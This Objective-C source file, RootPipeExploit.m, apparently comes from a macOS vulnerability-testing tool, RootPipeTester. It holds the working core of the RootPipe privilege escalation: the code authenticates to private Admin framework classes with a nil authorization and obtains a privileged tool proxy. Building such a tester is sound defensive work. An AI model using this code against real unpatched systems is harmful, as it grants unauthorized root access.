//
//  RootPipeExploit.m
//  RootPipeTester
//
//  Created by Takashi Yoshi on 20.04.15.
//  Copyright 2015 Takashi Yoshi.
//
//  
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//  
//  This program is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.
//  
//  You should have received a copy of the GNU General Public License
//  along with this program.  If not, see <http://www.gnu.org/licenses/>.
//

#import "RootPipeExploit.h"

static Class Authenticator = nil;
static Class WriteConfigClient = nil;
static Class ToolLiaison = nil;

@implementation RootPipeExploit

+ (void)initialize {
	if (self == [RootPipeExploit class]) {
		Authenticator = NSClassFromString(@"Authenticator");
		WriteConfigClient = NSClassFromString(@"WriteConfigClient");
		ToolLiaison = NSClassFromString(@"ToolLiaison");
	}
}

+ (RootPipeAPIVersion)apiVersion {
	if (NSClassFromString(@"WriteConfigClient")) return RootPipeNewApi; //10.9 or higher
	if (NSClassFromString(@"ToolLiaison")) return RootPipeOldApi; // 10.8 or lower
	
	return 0;
}

+ (id)authorizaton {
	if (NSClassFromString(@"SFAuthorization")) {
		// SecurityFoundation exists (10.3 or higher)
		return [SFAuthorization authorization];
	} else if (NSClassFromString(@"NSAuthorization")) {
		// NSAuthorization class exists (10.2 only)
		// TODO: Implement
	}
	
	return nil;
}

+ (id)getTool:(BOOL)useAuth {
	// This is where the magic happens
	id tool = nil;
	
	@try {
		id auth = (useAuth ? [[self class] authorizaton] : nil); //get auth only when needed.
		
		switch ([[self class] apiVersion]) {
			case RootPipeNewApi: {
				id sharedClient = [WriteConfigClient sharedClient];
				[sharedClient authenticateUsingAuthorizationSync:auth];
				tool = [sharedClient remoteProxy];
				break;
			}
			case RootPipeOldApi: {
				id authenticator = [Authenticator sharedAuthenticator];
				[authenticator authenticateUsingAuthorizationSync:auth];
				id sharedLiaison = [ToolLiaison sharedToolLiaison];
				tool = [sharedLiaison tool];			
				break;
			}
			default:
				break;
		}
		
	}
	@catch (NSException *e) {
		fprintf(stderr, "An %s was raised while trying to get tool: %s\n", [[e name] UTF8String], [[e reason] UTF8String]);
	}
	
	return tool;
}

+ (id)getTool {
	id tool = [self getTool:NO];
	if (tool == nil) tool = [self getTool:YES];
	return tool;
}

@end
